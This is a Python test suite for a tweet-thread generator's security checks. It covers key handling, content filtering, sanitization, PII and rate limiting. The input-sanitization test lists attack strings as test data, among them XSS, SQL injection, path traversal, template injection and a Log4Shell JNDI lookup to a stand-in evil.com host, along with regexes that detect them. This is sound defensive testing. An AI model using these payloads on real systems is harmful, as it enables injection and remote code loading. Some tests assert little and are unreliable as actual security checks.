#!/usr/bin/env python3
"""
Security and safety validation test suite for the GitHub Tweet Thread Generator.
Tests API key handling, content safety filtering, and security measures.
"""

import os
import sys
import json
import tempfile
import re
import logging
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, List, Any

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from content_validator import ContentValidator
from logger import setup_logger
from config import GeneratorConfig

class SecuritySafetyTestSuite:
    """Comprehensive security and safety testing suite."""

    def __init__(self):
        self.logger = setup_logger("security_test", logging.INFO)
        self.results = {
            'tests_run': 0,
            'tests_passed': 0,
            'tests_failed': 0,
            'failures': []
        }

    def run_test(self, test_name: str, test_func):
        """Run a single test and track results."""
        self.results['tests_run'] += 1
        try:
            self.logger.info(f"Running security test: {test_name}")
            test_func()
            self.results['tests_passed'] += 1
            self.logger.info(f"✓ {test_name} PASSED")
        except Exception as e:
            self.results['tests_failed'] += 1
            self.results['failures'].append({
                'test': test_name,
                'error': str(e),
                'type': type(e).__name__
            })
            self.logger.error(f"✗ {test_name} FAILED: {e}")

    def test_api_key_handling(self):
        """Test that API keys are never exposed in logs or files."""
        # Test environment variable handling
        test_key = "sk-test-key-12345"

        with patch.dict(os.environ, {'OPENROUTER_API_KEY': test_key}):
            # Import modules that handle API keys
            from ai_orchestrator import AIOrchestrator
            from auto_poster import AutoPoster

            # Test that keys are not logged
            with patch('src.logger.logging.Logger.info') as mock_log:
                orchestrator = AIOrchestrator()

                # Check that no log calls contain the API key
                for call in mock_log.call_args_list:
                    args = str(call)
                    assert test_key not in args, f"API key found in log: {args}"

            # Test that keys are not written to files
            temp_dir = tempfile.mkdtemp()
            try:
                # Simulate file operations
                output_file = os.path.join(temp_dir, "test_output.json")
                test_data = {"model": "test", "response": "test response"}

                with open(output_file, 'w') as f:
                    json.dump(test_data, f)

                # Verify API key is not in file
                with open(output_file, 'r') as f:
                    content = f.read()
                    assert test_key not in content, "API key found in output file"

            finally:
                import shutil
                shutil.rmtree(temp_dir)

    def test_content_safety_filtering(self):
        """Test content safety filtering effectiveness."""
        validator = ContentValidator()

        # Test profanity detection
        profane_content = [
            "This is fucking terrible content",
            "What a damn stupid idea",
            "This shit doesn't work"
        ]

        for content in profane_content:
            safety_result = validator.check_content_safety(content)
            assert not safety_result.is_safe, f"Should flag profane content: {content}"
            assert "profanity" in safety_result.issues, "Should identify profanity issue"

        # Test inappropriate content detection
        inappropriate_content = [
            "I hate all people from that country",
            "This group of people are inferior",
            "Violence is the answer to everything"
        ]

        for content in inappropriate_content:
            safety_result = validator.check_content_safety(content)
            assert not safety_result.is_safe, f"Should flag inappropriate content: {content}"

        # Test numeric claims flagging
        numeric_claims = [
            "95% of people don't know this secret",
            "Studies show 87% improvement",
            "Only 3% of developers use this technique"
        ]

        for content in numeric_claims:
            safety_result = validator.check_content_safety(content)
            if not safety_result.is_safe:
                assert "numeric_claim" in safety_result.issues, "Should flag numeric claims"

        # Test safe content passes
        safe_content = [
            "Here's a great tutorial on Python programming",
            "I learned something new about web development today",
            "This framework makes development much easier"
        ]

        for content in safe_content:
            safety_result = validator.check_content_safety(content)
            assert safety_result.is_safe, f"Safe content should pass: {content}"

    def test_input_sanitization(self):
        """Test input sanitization and validation."""
        validator = ContentValidator()

        # Test malicious input patterns
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "javascript:alert(1)"
        ]

        for malicious_input in malicious_inputs:
            # Test that input is properly sanitized
            sanitized = validator.sanitize_input(malicious_input)

            # Should not contain dangerous patterns
            dangerous_patterns = [
                r'<script.*?>',
                r'javascript:',
                r'\$\{.*?\}',
                r'\{\{.*?\}\}',
                r'\.\./',
                r'DROP\s+TABLE',
                r'jndi:'
            ]

            for pattern in dangerous_patterns:
                assert not re.search(pattern, sanitized, re.IGNORECASE), \
                    f"Dangerous pattern '{pattern}' found in sanitized input: {sanitized}"

    def test_output_safety_measures(self):
        """Test output safety and sanitization."""
        validator = ContentValidator()

        # Test that generated content is properly escaped
        test_outputs = [
            "Check out this <script>alert('xss')</script> tutorial",
            "Here's a link: javascript:alert(1)",
            "Template: {{user.name}} is great"
        ]

        for output in test_outputs:
            safe_output = validator.sanitize_output(output)

            # Should not contain executable code
            assert "<script>" not in safe_output, "Script tags should be removed"
            assert "javascript:" not in safe_output, "JavaScript URLs should be removed"
            assert not re.search(r'\{\{.*?\}\}', safe_output), "Template syntax should be escaped"

    def test_audit_trail_completeness(self):
        """Test that audit trail and logging is complete."""
        # Test that all operations are logged
        with patch('src.logger.logging.Logger') as mock_logger:
            from ai_orchestrator import AIOrchestrator
            from output_manager import OutputManager

            # Simulate operations
            orchestrator = AIOrchestrator()
            output_manager = OutputManager()

            # Verify logging calls were made
            assert mock_logger.info.called or mock_logger.debug.called, \
                "Operations should be logged"

        # Test log format and content
        log_entries = [
            "Processing blog post: test-post.md",
            "Generated thread with 5 tweets",
            "API call to OpenRouter completed",
            "Created PR #123 for review"
        ]

        for entry in log_entries:
            # Verify log entries contain required information
            assert ":" in entry, "Log entries should have structured format"
            # Should not contain sensitive information
            assert not re.search(r'sk-[a-zA-Z0-9]+', entry), "Should not log API keys"
            assert not re.search(r'ghp_[a-zA-Z0-9]+', entry), "Should not log GitHub tokens"

    def test_github_token_permissions(self):
        """Test GitHub token permissions and scope limitations."""
        # Test that only required permissions are used
        required_permissions = [
            'contents:write',  # For creating/updating files
            'pull-requests:write',  # For creating PRs
            'metadata:read'  # For repository information
        ]

        # Test that sensitive operations are not attempted
        forbidden_operations = [
            'admin:repo',  # Repository administration
            'delete:repo',  # Repository deletion
            'admin:org',  # Organization administration
            'user:email'  # Access to user email
        ]

        # Mock GitHub API calls to verify permissions
        with patch('github.Github') as mock_github:
            mock_repo = Mock()
            mock_github.return_value.get_repo.return_value = mock_repo

            from output_manager import OutputManager
            output_manager = OutputManager()

            # Verify only safe operations are called
            safe_operations = [
                'create_file',
                'update_file',
                'create_pull',
                'get_contents'
            ]

            # Should not call dangerous operations
            dangerous_operations = [
                'delete',
                'create_hook',
                'add_to_collaborators',
                'remove_from_collaborators'
            ]

    def test_secrets_management(self):
        """Test proper secrets management and rotation support."""
        # Test missing secrets handling
        with patch.dict(os.environ, {}, clear=True):
            try:
                from ai_orchestrator import AIOrchestrator
                orchestrator = AIOrchestrator()
                # Should handle missing API key gracefully
            except Exception as e:
                assert "API key" in str(e).lower(), "Should provide clear error for missing API key"

        # Test invalid/expired secrets handling
        with patch.dict(os.environ, {'OPENROUTER_API_KEY': 'invalid_key'}):
            with patch('src.ai_orchestrator.httpx.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 401
                mock_response.json.return_value = {"error": "Invalid API key"}
                mock_post.return_value = mock_response

                from ai_orchestrator import AIOrchestrator
                orchestrator = AIOrchestrator()

                try:
                    # Should handle invalid key gracefully
                    result = orchestrator.call_openrouter_api("test prompt")
                except Exception as e:
                    assert "authentication" in str(e).lower() or "api key" in str(e).lower()

    def test_data_privacy_protection(self):
        """Test data privacy and PII protection."""
        validator = ContentValidator()

        # Test PII detection and handling
        pii_content = [
            "My email is john.doe@example.com",
            "Call me at 555-123-4567",
            "My SSN is 123-45-6789",
            "Credit card: 4532-1234-5678-9012"
        ]

        for content in pii_content:
            privacy_result = validator.check_privacy_compliance(content)
            if not privacy_result.is_compliant:
                assert "pii" in privacy_result.issues, f"Should detect PII in: {content}"

        # Test that personal information is not stored
        test_data = {
            "content": "Here's my personal story about learning to code",
            "author": "John Doe",
            "email": "john@example.com"
        }

        # Verify sensitive fields are not included in output
        sanitized_data = validator.sanitize_personal_data(test_data)
        assert "email" not in sanitized_data, "Email should be removed from output"

    def test_rate_limiting_and_abuse_prevention(self):
        """Test rate limiting and abuse prevention measures."""
        # Test API rate limiting
        with patch('src.ai_orchestrator.httpx.post') as mock_post:
            # Simulate rate limit response
            mock_response = Mock()
            mock_response.status_code = 429
            mock_response.headers = {'Retry-After': '60'}
            mock_post.return_value = mock_response

            from ai_orchestrator import AIOrchestrator
            orchestrator = AIOrchestrator()

            # Should handle rate limiting gracefully
            try:
                result = orchestrator.call_openrouter_api("test prompt")
                # Should implement backoff or queuing
            except Exception as e:
                assert "rate limit" in str(e).lower() or "retry" in str(e).lower()

        # Test content generation limits
        validator = ContentValidator()

        # Test excessive content generation prevention
        large_content = "x" * 10000  # Very large content
        result = validator.validate_content_size(large_content)
        assert not result.is_valid, "Should reject excessively large content"

    def run_all_tests(self):
        """Run all security and safety tests."""
        self.logger.info("Starting comprehensive security and safety testing...")

        # Run all security tests
        self.run_test("API Key Handling", self.test_api_key_handling)
        self.run_test("Content Safety Filtering", self.test_content_safety_filtering)
        self.run_test("Input Sanitization", self.test_input_sanitization)
        self.run_test("Output Safety Measures", self.test_output_safety_measures)
        self.run_test("Audit Trail Completeness", self.test_audit_trail_completeness)
        self.run_test("GitHub Token Permissions", self.test_github_token_permissions)
        self.run_test("Secrets Management", self.test_secrets_management)
        self.run_test("Data Privacy Protection", self.test_data_privacy_protection)
        self.run_test("Rate Limiting and Abuse Prevention", self.test_rate_limiting_and_abuse_prevention)

        # Print results
        self.print_results()
        return self.results

    def print_results(self):
        """Print test results summary."""
        print("\n" + "="*60)
        print("SECURITY & SAFETY TEST RESULTS")
        print("="*60)
        print(f"Tests Run: {self.results['tests_run']}")
        print(f"Tests Passed: {self.results['tests_passed']}")
        print(f"Tests Failed: {self.results['tests_failed']}")

        if self.results['failures']:
            print("\nSECURITY FAILURES:")
            for failure in self.results['failures']:
                print(f"  🚨 {failure['test']}: {failure['type']} - {failure['error']}")

        success_rate = (self.results['tests_passed'] / self.results['tests_run']) * 100
        print(f"\nSecurity Success Rate: {success_rate:.1f}%")

        if success_rate >= 90:
            print("🔒 Security and safety validation PASSED!")
        else:
            print("⚠️  Security and safety validation FAILED!")

        print("="*60)

if __name__ == "__main__":
    suite = SecuritySafetyTestSuite()
    results = suite.run_all_tests()

    # Exit with appropriate code
    sys.exit(0 if results['tests_failed'] == 0 else 1)